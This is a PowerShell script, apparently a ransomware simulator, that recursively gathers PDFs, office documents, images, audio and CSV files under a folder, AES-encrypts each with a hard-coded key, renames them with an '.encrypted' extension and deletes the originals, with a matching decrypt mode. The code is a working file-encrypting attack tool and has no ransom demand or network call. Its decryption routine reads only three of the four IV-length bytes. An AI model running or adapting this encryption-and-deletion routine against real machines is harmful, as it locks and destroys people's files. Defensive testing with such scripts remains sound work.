#Parameters to operate the script.
param([Parameter(Mandatory=$true)][string]$Mode,
      [string]$FileTargetPath = "C:\Users\mon\Documents\Kube",
      [string]$Extension = ".encrypted",
      [string]$Key = "S4Xe7C57wbNVgmUss7xUjJOoICLdaW1Zgrks4s1hN4E=",
      [string[]]$TargetFiles = ('*.pdf*','*.mp3*','*.txt*','*.xls*','*.ppt*','*.doc*','*.mpg*','*.mpeg*','*.rtf*','*.jpg*','*.jpeg*','*.png*','*.gif*', '*.csv*')
)

#Enumerate the files and start a counter for command line feedback
Write-Host "Gathering files under $FileTargetPath"
$Files = get-childitem -path $FileTargetPath -Include $TargetFiles -Recurse -force | Where-Object { ! $_.PSIsContainer }
$c = 0

#For each file in the files list, apply cryptography using the above key and add the extension
if ($mode -eq "encrypt") {
    foreach ($file in $Files)
    {
	$c++
	Write-Progress -Activity "Encrypting $file" -Status "[$c/$($Files.Count)]" -PercentComplete (($c/$($Files.Count))*100)
    $Algorithm = 'AES'
    [System.Security.Cryptography.CipherMode]$CipherMode = 'CBC'
    [System.Security.Cryptography.PaddingMode]$PaddingMode = 'PKCS7'

    #Configure cryptography
    try
    {
        $CKey = $Key | ConvertTo-SecureString -AsPlainText -Force
        #Decrypt cryptography Key from SecureString
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($CKey)
        $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))

        $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
        #If specified, use a cipher mode and padding mode (specified above statically in this instance)
        if($PSBoundParameters.ContainsKey('CipherMode')){
            $Crypto.Mode = $CipherMode
        }
        if($PSBoundParameters.ContainsKey('PaddingMode')){
            $Crypto.Padding = $PaddingMode
        }
        $Crypto.KeySize = $EncryptionKey.Length*8
        $Crypto.Key = $EncryptionKey
    }
    #Catch any errors and stop the process.
    Catch
    {
        Write-Error $_ -ErrorAction Stop
    }
    
    #Subloop does the actual encryption. I could probably improve this but it's working so...
    $cFiles = Get-Item -LiteralPath $file

    #Each file is opened, an IV is written to it, and it is encrypted.
    ForEach($cFile in $cFiles)
    {
        $DestinationFile = $cFile.FullName + $Extension

        Try
        {
            $FileStreamReader = New-Object System.IO.FileStream($cFile.FullName, [System.IO.FileMode]::Open)
            $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)

            #Write IV (initialization-vector) length & IV to encrypted file
            $Crypto.GenerateIV()
            $FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4)
            $FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length)

            #Perform encryption
            $Transform = $Crypto.CreateEncryptor()
            $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
            $FileStreamReader.CopyTo($CryptoStream)

            #Close open files
            $CryptoStream.FlushFinalBlock()
            $CryptoStream.Close()
            $FileStreamReader.Close()
            $FileStreamWriter.Close()

            #Delete unencrypted file
            Remove-Item -LiteralPath $cFile.FullName

            #Output encrypted file
            $result = Get-Item $DestinationFile
            $result | Add-Member -MemberType NoteProperty -Name SourceFile -Value $cFile.FullName
            $result | Add-Member -MemberType NoteProperty -Name Algorithm -Value $Algorithm
            $result | Add-Member -MemberType NoteProperty -Name Key -Value $Key
            $result | Add-Member -MemberType NoteProperty -Name CipherMode -Value $Crypto.Mode
            $result | Add-Member -MemberType NoteProperty -Name PaddingMode -Value $Crypto.Padding
            $result
        }
        #Any errors in a file are caught and the file is removed.
        Catch
        {
            Write-Error $_
            If($FileStreamWriter)
            {
                #Remove failed file
                $FileStreamWriter.Close()
                Remove-Item -LiteralPath $DestinationFile -Force
            }
            Continue
        }
        #Close the file
        Finally
        {
            if($CryptoStream){$CryptoStream.Close()}
            if($FileStreamReader){$FileStreamReader.Close()}
            if($FileStreamWriter){$FileStreamWriter.Close()}
        }
    }
    }
}

#Decryption mode
elseif ($mode -eq "decrypt") {
    #For each loop configures cryptography from same parameters and decrypts
    foreach ($file in $Files)
    {
	$c++
	Write-Progress -Activity "Decrypting $file" -Status "[$c/$($Files.Count)]" -PercentComplete (($c/$($Files.Count))*100)
    $Algorithm = 'AES'
    [System.Security.Cryptography.CipherMode]$CipherMode = 'CBC'
    [System.Security.Cryptography.PaddingMode]$PaddingMode = 'PKCS7'
    $RemoveSource = $true

    #Configure cryptography
    try
    {
        $DKey = $Key | ConvertTo-SecureString -AsPlainText -Force
        #Decrypt cryptography Key from SecureString
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($DKey)
        $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))

        $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
        $Crypto.Mode = $CipherMode
        $Crypto.Padding = $PaddingMode
        $Crypto.KeySize = $EncryptionKey.Length*8
        $Crypto.Key = $EncryptionKey
    }
    #Once again, catch errors and stop if required
    Catch
    {
        Write-Error $_ -ErrorAction Stop
    }

    #Used to store successfully decrypted file names.
    $dFiles = Get-Item -LiteralPath $file

    #Subloop to do the actual decryption
    ForEach($dFile in $dFiles)
    {
        #Verify file ends with supplied suffix
        If(-not $dFile.Name.EndsWith($Extension))
        {
            Write-Error "$($dFile.FullName) does not have an extension of '$Extension'."
            Continue
        }

        $DestinationFile = $dFile.FullName -replace "$Extension$"

        Try
        {
            $FileStreamReader = New-Object System.IO.FileStream($dFile.FullName, [System.IO.FileMode]::Open)
            $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)

            #Get IV from file
            [Byte[]]$LenIV = New-Object Byte[] 4
            $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileStreamReader.Read($LenIV,  0, 3) | Out-Null
            [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
            [Byte[]]$IV = New-Object Byte[] $LIV
            $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileStreamReader.Read($IV, 0, $LIV) | Out-Null
            $Crypto.IV = $IV

            #Peform Decryption
            $Transform = $Crypto.CreateDecryptor()
            $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
            $FileStreamReader.CopyTo($CryptoStream)

            #Close open files
            $CryptoStream.FlushFinalBlock()
            $CryptoStream.Close()
            $FileStreamReader.Close()
            $FileStreamWriter.Close()

            #Delete encrypted file
            if($RemoveSource){Remove-Item $dFile.FullName}

            #Output decrypted file
            Get-Item $DestinationFile | Add-Member -MemberType NoteProperty -Name SourceFile -Value $dFile.FullName -PassThru
        }
        Catch
        {
            Write-Error $_
            If($FileStreamWriter)
            {
                #Remove failed file
                $FileStreamWriter.Close()
                Remove-Item -LiteralPath $DestinationFile -Force
            }
            Continue
        }
        Finally
        {
            if($CryptoStream){$CryptoStream.Close()}
            if($FileStreamReader){$FileStreamReader.Close()}
            if($FileStreamWriter){$FileStreamWriter.Close()}
        }
    }


    }
} 
#If no mode is specified, do nothing
else {
    write-host "Invalid mode. Use either encrypt or decrypt."
}